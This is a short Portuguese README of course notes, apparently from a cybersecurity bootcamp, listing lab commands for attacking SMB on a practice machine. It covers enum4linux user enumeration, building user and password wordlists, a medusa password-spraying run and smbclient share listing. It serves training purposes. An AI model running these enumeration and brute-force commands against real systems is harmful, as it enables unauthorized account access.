# Curso-dio-Santander-Ciberseguranca


Comando para modelo SMB
Para iniciar o ataque precisa conhcer seu usuário o comanodo é:
<br>
<p>enum4linux -a ip_da_máquina_aqui | tee enum4_output.txt</p>
<br>
<br>

Comando para abrir uma lista de arquivos:
<p>less enum4 _output.txt</p>
<br>
Vai aparecer varias informações e mais embaixo vai aparecer o campo dos usuários

Ex: user[arthur] rid:[#####]

Para sair clique em "q"
<br>
<br>

Criar wordlist 

Depois disso coloque esse comando para o txt dos usuário:
<br>
<p>echo -e "user\nmsfadmin\nservice" > smb_user.txt</p>
<br>
<br>

Outro comando para as senhas:
<br>
<p>echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt</p>
<br>
<br>
<br>

Esse comando serve para simular dois usuário gerando senhas e uusário:
<br>
<p>medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50</p>
<br>
<br>
<br>
Outro comando para saber se ele vai ter acesso ao administrador:
<br>
<p>smbclient -L //192.168.56.103 -U msfadmin</p>

